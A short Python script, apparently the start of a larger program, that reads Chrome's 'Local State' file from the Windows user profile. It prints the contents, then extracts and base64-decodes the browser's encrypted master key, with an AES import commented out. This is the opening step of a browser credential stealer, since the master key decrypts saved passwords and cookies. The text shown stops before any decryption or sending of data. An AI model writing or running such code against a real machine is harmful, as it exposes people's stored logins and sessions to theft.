#from Cryptodome.Cipher import AES
import os,json,base64,sqlite3,shutil

local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome","User Data", "Local State")
print(local_computer_directory_path)

with open(local_computer_directory_path,'r',encoding='utf-8') as f:
    local_state_data = f.read()
    local_state_data = json.loads(local_state_data)
print(local_state_data)
print("_______")
print(local_state_data["os_crypt"]["encrypted_key"])
encryp_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])